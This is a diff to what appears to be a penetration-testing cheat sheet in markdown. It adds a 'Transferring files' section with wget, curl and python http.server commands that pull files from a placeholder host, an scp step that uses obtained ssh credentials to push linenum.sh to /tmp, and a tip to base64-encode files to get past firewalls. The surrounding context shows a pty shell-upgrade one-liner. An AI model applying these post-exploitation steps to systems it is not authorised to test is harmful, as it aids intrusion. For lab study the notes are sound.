@@ -156,8 +156,26 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 There are many ways to do this, do the research. 
 
+<br>
 
+### Transferring files 
+**WGET:** You can setup a python http server on the device that has the file you want to transfer, and use wget on the remote machine to pull it. 
+```
+# setup python server
+python3 -m http.server 8000
 
+# Use wget to pull the file
+wget http://[ip]:[port]/[file dir]
 
+# You can also use curl to pull the file
+curl http://[ip]:[port]/[file dir] -o [File name you want]
+```
+
+If you happen to obtain the ssh creds of a box, you can use SCP
+```
+scp [file you want to transfer] user@remotehost:/tmp/linenum.sh
+```
+
+**Note:** If a firewall is stopping the transfer of some files, you can try encoding the file in base64, copy and pasting it over to the remote machine, and then decoding it there. 
 
 
